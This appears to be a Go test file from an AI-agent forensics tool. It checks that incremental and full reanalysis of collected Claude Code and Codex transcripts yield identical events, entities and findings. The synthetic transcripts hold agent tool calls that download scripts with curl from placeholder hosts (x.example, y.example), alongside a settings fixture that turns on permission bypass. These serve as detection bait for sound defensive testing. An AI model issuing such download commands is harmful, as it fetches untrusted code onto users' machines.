package analysis

import (
	"encoding/json"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/efij/AgentDFIR/v2/internal/casepkg"
	"github.com/efij/AgentDFIR/v2/internal/collector"
	"github.com/efij/AgentDFIR/v2/internal/normalize"
	"github.com/efij/AgentDFIR/v2/internal/overlay"
	"github.com/efij/AgentDFIR/v2/internal/products"
	"github.com/efij/AgentDFIR/v2/internal/schema"
)

// claudeLines writes a Claude Code transcript with n tool calls.
func claudeLines(session string, from, to int) string {
	var b strings.Builder
	b.WriteString(`{"type":"user","uuid":"` + session + `-u","sessionId":"` + session +
		`","timestamp":"2026-08-30T10:00:00Z","message":{"role":"user","content":"go"}}` + "\n")
	for i := from; i < to; i++ {
		id := session + "-a" + string(rune('0'+i%10))
		b.WriteString(`{"type":"assistant","uuid":"` + id + `","parentUuid":"` + session +
			`-u","sessionId":"` + session + `","timestamp":"2026-08-30T10:00:0` + string(rune('0'+i%10)) +
			`Z","message":{"role":"assistant","model":"claude","content":[{"type":"tool_use","id":"t` +
			id + `","name":"Bash","input":{"command":"curl http://x.example/p` + id + `.sh -o /tmp/p.sh"}}]}}` + "\n")
	}
	return b.String()
}

// codexLines writes a Codex CLI rollout transcript with n function calls.
func codexLines(session string, from, to int) string {
	var b strings.Builder
	b.WriteString(`{"timestamp":"2026-08-30T10:00:00Z","type":"session_meta","payload":{"id":"` +
		session + `","cwd":"/w","cli_version":"0.1"}}` + "\n")
	for i := from; i < to; i++ {
		b.WriteString(`{"timestamp":"2026-08-30T10:00:0` + string(rune('0'+i%10)) +
			`Z","type":"response_item","payload":{"type":"function_call","name":"shell","call_id":"c` +
			string(rune('0'+i%10)) + `","arguments":"{\"command\":[\"bash\",\"-lc\",\"curl http://y.example/q.sh\"]}"}}` + "\n")
	}
	return b.String()
}

// writeProfile lays out a home directory with Claude and Codex sessions.
// Transcript "b" and "y" are the ones a second round finds grown.
func writeProfile(t *testing.T, root string, round int) {
	t.Helper()
	cdir := filepath.Join(root, ".claude", "projects", "p")
	xdir := filepath.Join(root, ".codex", "sessions")
	if err := os.MkdirAll(cdir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(xdir, 0o755); err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(filepath.Join(root, ".claude", "settings.json"),
		[]byte(`{"permissions":{"defaultMode":"bypassPermissions"}}`), 0o644)
	write := func(p, s string) {
		if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// "a" and "c" never change: "a" sorts before the transcript that grows
	// (so its segment is copied back at the same position) and "c" sorts
	// after it (so its segment has to be renumbered).
	write(filepath.Join(cdir, "a.jsonl"), claudeLines("sa", 0, 3))
	write(filepath.Join(cdir, "c.jsonl"), claudeLines("sc", 0, 4))
	write(filepath.Join(xdir, "x.jsonl"), codexLines("sx", 0, 3))
	if round == 1 {
		write(filepath.Join(cdir, "b.jsonl"), claudeLines("sb", 0, 2))
		write(filepath.Join(xdir, "y.jsonl"), codexLines("sy", 0, 2))
		return
	}
	// Round 2: two transcripts grew and one is new.
	write(filepath.Join(cdir, "b.jsonl"), claudeLines("sb", 0, 6))
	write(filepath.Join(xdir, "y.jsonl"), codexLines("sy", 0, 5))
	write(filepath.Join(cdir, "d.jsonl"), claudeLines("sd", 0, 3))
}

func collectRound(t testing.TB, b *casepkg.Builder, root string) {
	t.Helper()
	for _, p := range []struct{ id, cfg string }{
		{"claude-code", filepath.Join(root, ".claude")},
		{"codex-cli", filepath.Join(root, ".codex")},
	} {
		man, err := products.ManifestAllPlatforms(p.id)
		if err != nil || man == nil {
			t.Fatalf("manifest %s: %v", p.id, err)
		}
		if _, err := collector.Run(b, man, collector.Options{
			ProfileRoot: root, ConfigRoot: p.cfg, SystemRoot: root, Product: p.id,
		}); err != nil {
			t.Fatalf("collect %s: %v", p.id, err)
		}
	}
	if err := b.Seal(); err != nil {
		t.Fatal(err)
	}
}

func copyPkg(t *testing.T, src string) string {
	t.Helper()
	dst := filepath.Join(t.TempDir(), "copy.adfir")
	if err := os.CopyFS(dst, os.DirFS(src)); err != nil {
		t.Fatal(err)
	}
	// os.CopyFS preserves the read-only bits the sealed zone carries.
	if err := filepath.WalkDir(dst, func(p string, _ os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		return os.Chmod(p, 0o700)
	}); err != nil {
		t.Fatal(err)
	}
	return dst
}

// readFile reads an overlay file in whichever form it is stored in:
// events.jsonl is plaintext because the index seeks it, everything else
// (entities, relationships, the segments) is gzipped.
func readFile(t *testing.T, path string) string {
	t.Helper()
	data, err := overlay.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

// canonicalFindings renders findings as a sorted set of JSON documents, so
// two runs are compared on content rather than on the order two map
// iterations happened to produce.
func canonicalFindings(t *testing.T, f []schema.Finding) []string {
	t.Helper()
	out := make([]string, 0, len(f))
	for _, x := range f {
		data, err := json.Marshal(x)
		if err != nil {
			t.Fatal(err)
		}
		out = append(out, string(data))
	}
	sort.Strings(out)
	return out
}

// TestIncrementalOverlayMatchesFullReanalysis is the acceptance test for
// incremental analysis, and the only thing that makes it safe to ship.
//
// Analysis used to throw the whole overlay away whenever a collection
// round appended to the manifest: on a real two-round package that was 7
// minutes 27 seconds to re-parse 206,896 events out of transcripts that
// had not changed a byte. It is now segmented per source artifact, and the
// segments of unchanged artifacts are copied back instead of re-derived.
//
// The risk that buys is silent divergence. The parsers carry state across
// artifacts — one sequence counter naming every event, one entity map, one
// relationship list — so a subset parse that looked fine could still
// produce a different entity graph and a different agent lineage, which is
// exactly what the detection rules are built on. This test pins the two
// paths together: the same two-round package analyzed incrementally and
// analyzed from scratch has to produce the same events, the same entities,
// the same relationships and the same findings, byte for byte where the
// output is ordered and as a set where it is not.
func TestIncrementalOverlayMatchesFullReanalysis(t *testing.T) {
	root := t.TempDir()
	writeProfile(t, root, 1)

	pkg := filepath.Join(t.TempDir(), "inc.adfir")
	b, err := casepkg.New(pkg, "INC", casepkg.CaseInfo{OperatorOSUser: "t"})
	if err != nil {
		t.Fatal(err)
	}
	collectRound(t, b, root)

	// Round 1 analysis: nothing cached yet, everything parsed.
	first, err := Run(pkg, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if first.Reparsed == 0 {
		t.Fatal("first analysis parsed no artifacts; the fixture proves nothing")
	}
	if first.Reused != 0 {
		t.Fatalf("first analysis reused %d artifact(s) with no overlay to reuse", first.Reused)
	}
	if len(first.Findings) == 0 {
		t.Fatal("fixture produced no findings; the comparison below would prove nothing")
	}

	// Round 2: two transcripts grew, one is new, three are untouched.
	writeProfile(t, root, 2)
	b2, err := casepkg.Reopen(pkg, casepkg.CaseInfo{OperatorOSUser: "t"})
	if err != nil {
		t.Fatal(err)
	}
	collectRound(t, b2, root)

	// The same package, analyzed both ways.
	clone := copyPkg(t, pkg)
	inc, err := Run(pkg, Options{})
	if err != nil {
		t.Fatal(err)
	}
	full, err := Run(clone, Options{Renormalize: true})
	if err != nil {
		t.Fatal(err)
	}

	if !inc.Renormalized || !full.Renormalized {
		t.Fatalf("a new round must rebuild the overlay: incremental=%v full=%v", inc.Renormalized, full.Renormalized)
	}
	if inc.Reused == 0 {
		t.Fatal("no artifact was served from a segment; the incremental path never ran")
	}
	if inc.Reparsed == 0 {
		t.Fatal("no artifact was re-parsed; the fixture did not actually change anything")
	}
	if full.Reused != 0 {
		t.Fatalf("--renormalize reused %d segment(s); it must force a full rebuild", full.Reused)
	}
	if inc.Reparsed >= full.Reparsed {
		t.Fatalf("incremental parsed %d of %d artifacts — no work was saved", inc.Reparsed, full.Reparsed)
	}

	// Events, entities and relationships are ordered output: identical bytes.
	for _, name := range []string{"events.jsonl", "entities.jsonl", "relationships.jsonl"} {
		got := readFile(t, filepath.Join(pkg, "normalized", name))
		want := readFile(t, filepath.Join(clone, "normalized", name))
		if got == want {
			continue
		}
		g, w := strings.Split(got, "\n"), strings.Split(want, "\n")
		if len(g) != len(w) {
			t.Fatalf("%s: incremental has %d line(s), full has %d", name, len(g)-1, len(w)-1)
		}
		for i := range g {
			if g[i] != w[i] {
				t.Fatalf("%s line %d diverged:\n incremental: %s\n full:        %s", name, i+1, g[i], w[i])
			}
		}
	}

	if inc.Events != full.Events {
		t.Fatalf("events: incremental %d, full %d", inc.Events, full.Events)
	}
	if inc.Entities != full.Entities {
		t.Fatalf("entities: incremental %d, full %d", inc.Entities, full.Entities)
	}

	gotF, wantF := canonicalFindings(t, inc.Findings), canonicalFindings(t, full.Findings)
	if len(gotF) != len(wantF) {
		t.Fatalf("findings: incremental %d, full %d", len(gotF), len(wantF))
	}
	for i := range gotF {
		if gotF[i] != wantF[i] {
			t.Fatalf("finding %d diverged:\n incremental: %s\n full:        %s", i, gotF[i], wantF[i])
		}
	}

	// A rebuild with nothing changed must reuse every segment: this is the
	// case a third collection round on a quiet machine hits.
	dir := filepath.Join(pkg, "normalized")
	again, err := normalize.BuildOverlay(pkg, dir, normalize.OverlayOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if again.Reparsed != 0 {
		t.Fatalf("rebuild with no new evidence re-parsed %d artifact(s)", again.Reparsed)
	}
	if again.Reused != inc.Reused+inc.Reparsed {
		t.Fatalf("rebuild reused %d of %d artifact(s)", again.Reused, inc.Reused+inc.Reparsed)
	}
	if again.EventCount != inc.Events {
		t.Fatalf("rebuild from segments alone produced %d events, want %d", again.EventCount, inc.Events)
	}
	// Compared against a freshly forced full parse of the clone rather than
	// against the clone's analyzed overlay, because the later stages write
	// corroboration states back into events.jsonl and the segments hold the
	// evidence as parsed.
	cloneDir := filepath.Join(clone, "normalized")
	if _, err := normalize.BuildOverlay(clone, cloneDir, normalize.OverlayOptions{Full: true}); err != nil {
		t.Fatal(err)
	}
	if readFile(t, filepath.Join(dir, "events.jsonl")) != readFile(t, filepath.Join(cloneDir, "events.jsonl")) {
		t.Fatal("a rebuild from segments alone no longer matches a full parse")
	}
}

// TestRenormalizeRewritesSegments: --renormalize is the analyst's escape
// hatch, so it has to reach the segments too. A stale segment left behind
// by a forced rebuild would be picked up by the next round and quietly
// reinstate the evidence the analyst asked to discard.
func TestRenormalizeRewritesSegments(t *testing.T) {
	root := t.TempDir()
	writeProfile(t, root, 1)
	pkg := filepath.Join(t.TempDir(), "renorm.adfir")
	b, err := casepkg.New(pkg, "RENORM", casepkg.CaseInfo{OperatorOSUser: "t"})
	if err != nil {
		t.Fatal(err)
	}
	collectRound(t, b, root)
	if _, err := Run(pkg, Options{}); err != nil {
		t.Fatal(err)
	}

	segDir := filepath.Join(pkg, "normalized", "events")
	before := segFiles(t, segDir)
	if len(before) == 0 {
		t.Fatal("no segments written")
	}
	// Corrupt every segment. A full rebuild must not read them at all, and
	// must leave correct ones behind.
	for _, p := range before {
		if err := os.WriteFile(p, []byte("{not json\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	res, err := Run(pkg, Options{Renormalize: true})
	if err != nil {
		t.Fatalf("--renormalize over corrupt segments: %v", err)
	}
	if res.Reused != 0 || res.Reparsed == 0 {
		t.Fatalf("--renormalize reused %d and parsed %d", res.Reused, res.Reparsed)
	}
	for _, p := range segFiles(t, segDir) {
		if strings.Contains(readFile(t, p), "not json") {
			t.Fatalf("%s survived a forced rebuild", p)
		}
	}

	// And a corrupt overlay must heal rather than make the case
	// un-analyzable: an incremental rebuild falls back to a full parse.
	for _, p := range segFiles(t, segDir) {
		if err := os.WriteFile(p, []byte("{not json\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	healed, err := normalize.BuildOverlay(pkg, filepath.Join(pkg, "normalized"), normalize.OverlayOptions{})
	if err != nil {
		t.Fatalf("corrupt segments must not fail analysis: %v", err)
	}
	if healed.EventCount != res.Events {
		t.Fatalf("healed overlay has %d events, want %d", healed.EventCount, res.Events)
	}
}

func segFiles(t *testing.T, segDir string) []string {
	t.Helper()
	var out []string
	err := filepath.WalkDir(segDir, func(p string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() && strings.HasSuffix(p, ".jsonl"+overlay.Suffix) {
			out = append(out, p)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	sort.Strings(out)
	return out
}
